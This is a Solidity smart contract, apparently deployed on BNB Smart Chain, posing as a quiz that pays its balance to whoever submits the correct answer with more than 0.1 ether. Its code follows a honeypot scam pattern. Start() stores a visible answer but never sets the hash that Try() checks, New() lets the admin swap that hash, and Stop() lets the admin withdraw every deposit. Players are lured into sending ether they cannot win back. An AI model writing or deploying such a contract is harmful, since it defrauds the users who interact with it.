/**
 *Submitted for verification at BscScan.com on 2022-06-12
*/

contract blockchain_Quiz
{
    function Try(string memory _response) public payable
    {
        require(msg.sender == tx.origin);

        if(responseHash == keccak256(abi.encode(_response)) && msg.value > 0.1 ether)
        {
            payable(msg.sender).transfer(address(this).balance);
        }
    }

    string public question;
    string response;

    bytes32 public responseHash;

    address admin;

    function Start(string calldata _question, string calldata _response) public payable isAdmin{
        if(responseHash==0x0){
            response = _response;
            question = _question;
        }
    }

    function Stop() public payable isAdmin {
        payable(msg.sender).transfer(address(this).balance);
    }

    function New(string calldata _question, bytes32 _responseHash) public payable isAdmin {
        question = _question;
        responseHash = _responseHash;
    }

    constructor() {
        admin = msg.sender;
    }

    modifier isAdmin(){
        require(msg.sender == admin);
        _;
    }

    fallback() external {}
}